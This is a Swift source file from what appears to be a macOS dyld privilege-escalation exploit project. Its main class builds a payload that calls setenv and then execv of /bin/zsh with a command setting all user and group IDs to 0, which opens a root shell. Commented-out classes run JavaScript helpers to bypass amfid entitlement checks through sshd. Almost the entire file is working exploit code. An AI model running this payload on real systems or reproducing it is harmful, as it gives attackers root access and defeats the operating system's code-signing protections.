//
//  closures.swift
//  dyldExploitMacOS
//
//  Created by Linus Henze.
//  Copyright Â© 2021 Linus Henze. All rights reserved.
//

import Foundation
import JailbreakUtils
import ClosurePwn

class MyPSPwn: PwnClosure {
    override func generatePayload() throws -> ClosureMemoryObject {
        try callCFunc(name: "setenv", arguments: [
            try pool.getStrRef("HOME"),
            try pool.getStrRef(String(cString: getenv("HOME"))),
            .absolute(address: 1)
        ]).insertNow()
        
        let mem = try pool.makeMemoryObject(size: 40, data: [
            .init(offset: 0, target: try pool.getStrRef("/bin/zsh")),
            .init(offset: 8, target: try pool.getStrRef("-p")),
            .init(offset: 16, target: try pool.getStrRef("-c")),
            .init(offset: 24, target: try pool.getStrRef("EUID=EGID=UID=GID=0 exec /bin/zsh")),
            .init(offset: 32, target: .absolute(address: 0))
        ])
        
        try callCFunc(name: "execv", arguments: [
            try pool.getStrRef("/bin/zsh"),
            mem.reference
        ]).insertNow()
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 1)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}

// Some code to launch an executable with custom entitlements
// Requires an additional helper that is allowed to set the exception port for amfid
// For some reason, sshd is allowed to do that

/*class MyPSPwn: GenericJSClosure {
    override func generatePayload() throws -> ClosureMemoryObject {
        try initJSRuntime(utilsPath: Bundle.main.bundlePath + "/utils.js", setupPath: Bundle.main.bundlePath + "/setup.js")
        
        try runJSFile(path: Bundle.main.bundlePath + "/amfi.js")
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 1)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}

class HelperPwn: GenericJSClosure {
    override func generatePayload() throws -> ClosureMemoryObject {
        try initJSRuntime(utilsPath: Bundle.main.bundlePath + "/utils.js", setupPath: Bundle.main.bundlePath + "/setup.js")
        
        try runJSFile(path: Bundle.main.bundlePath + "/helper.js")
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 1)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}*/
